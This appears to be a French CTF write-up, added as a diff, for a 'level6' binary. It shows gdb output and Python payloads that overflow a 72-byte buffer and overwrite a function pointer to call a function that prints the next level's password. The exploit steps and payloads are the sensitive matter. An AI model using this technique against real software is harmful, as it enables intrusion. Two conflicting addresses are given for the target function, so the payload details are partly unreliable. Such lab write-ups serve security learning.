@@ -1,0 +1,41 @@
+On test pour pour si le programme segfault avec des AAAAAAA
+Oui il segfault
+
+En checkant avec gdb avec des arguments valide on voit qu'il y a un call a eax a la fin du main, eax = m
+En regardant les fonctions présentes dans le binaire on remarque la fonction n.
+n contient un appel à system avec argument  "/bin/cat /home/user/level7/.pass"
+C'est le flag qu'on cherche.
+
+On cherche la taille d'input necessaire pour overflow avec une offset string, on trouve 72
+
+Observons la mémoire en rajoutant une chaine arbitraire après cet overflow.
+
+Starting program: /home/user/level6/level6 $(python -c 'print "A" * 72 + "CCCC"')
+
+Breakpoint 1, 0x080484c5 in main () (avant le strcpy)
+(gdb) x/wx $esp + 0x18
+0xbffff6a8:	0x0804a050
+(gdb) x/wx 0x0804a050
+0x804a050:	0x08048468          => adresse de la fonction m
+(gdb) c
+Continuing.
+Breakpoint 2, 0x080484ca in main () (après le strcpy)
+(gdb) x/wx $esp + 0x18
+0xbffff6a8:	0x0804a050
+(gdb) x/wx 0x0804a050
+0x804a050:	0x43434343          => notre chaine d'exemple a remplacé l'adresse de m
+
+On remplace l'adresse sur laquelle pointe le pointeur de fonction, on a remplacé l'adresse de m par 0x43434343
+
+Avec une payload ou l'on remplace "CCCC" par "\x54\x84\x04\x08"
+
+On va rediriger le call de main +84 sur la fonction n. 
+
+
+on va donc envoyer $(python -c 'print "A" * 72 + "\x54\x84\x04\x08"') pour overwitre l'adresse sur laquelle pointe le pointeur sur fonction avec l'adresse de n
+
+**Version source**
+n = 0x08048474 = \x74\x84\x04\x08
+0x08048474
+$(python -c 'print "A" * 72 + "\x74\x84\x04\x08"')
+******************
